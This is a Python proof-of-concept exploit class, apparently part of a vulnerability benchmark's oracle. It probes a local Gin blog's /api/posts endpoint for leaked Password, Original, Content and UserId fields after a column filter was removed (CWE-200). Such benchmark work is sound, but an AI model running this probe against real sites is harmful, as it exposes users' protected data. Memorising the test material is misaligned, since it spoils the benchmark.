"""PoC exploit: 3-stage post list leak via Cols removal — removes column filter, exposes full ZPosts entity including Password and Original (CWE-200)."""

from mosaic.oracle.exploit import ExploitTest


class SelectRemovalExploit(ExploitTest):
    """Post list leak: Password and Original fields exposed after Cols() removal."""

    def __init__(self, base_url: str = "http://localhost:39081"):
        super().__init__(base_url)

    @property
    def chain_id(self) -> str:
        return "gin_where_clause_select_removal"

    def setup(self) -> None:
        """No setup needed — public API."""
        pass

    def execute(self) -> tuple[bool, str]:
        """Fetch post list and check for leaked internal fields."""
        resp = self.http_get("/api/posts")

        if resp.status_code == 404:
            return False, "Endpoint returned 404."
        if not resp.ok:
            return False, f"HTTP {resp.status_code}: {resp.text[:200]}"

        try:
            data = resp.json()
        except Exception:
            return False, f"Could not parse JSON: {resp.text[:200]}"

        # Navigate Gin blog response format
        payload = data.get("data", data)
        if isinstance(payload, dict):
            items = payload.get("posts", payload.get("list", []))
            if isinstance(items, dict):
                items = [items]
        elif isinstance(payload, list):
            items = payload
        else:
            items = [data]

        if not items:
            return False, "No posts returned from /api/posts"

        for item in items:
            if not isinstance(item, dict):
                continue

            evidence = []
            vuln = False

            # Check for Password field (article password)
            val = item.get("Password") or item.get("password")
            if val is not None and val != "":
                evidence.append(f"'Password' field in response: '{str(val)[:30]}'")
                vuln = True

            # Check for Original field (raw markdown)
            orig = item.get("Original") or item.get("original")
            if orig is not None and orig != "":
                evidence.append(f"'Original' (raw markdown) in response: '{str(orig)[:50]}...'")
                vuln = True

            # Check for Content field (rendered HTML — should not be in listing)
            content = item.get("Content") or item.get("content")
            if content is not None and content != "":
                evidence.append(f"'Content' (full HTML) leaked in listing")
                vuln = True

            # Check for UserId (internal)
            if "UserId" in item or "userId" in item:
                evidence.append("'UserId' internal field exposed")
                vuln = True

            if vuln:
                return True, f"Data leaked at /api/posts (CWE-200). " + " ".join(evidence)

            field_names = list(item.keys())
            return False, f"Posts have only safe fields. Keys: {field_names}"

        return False, "Could not parse post items from response"
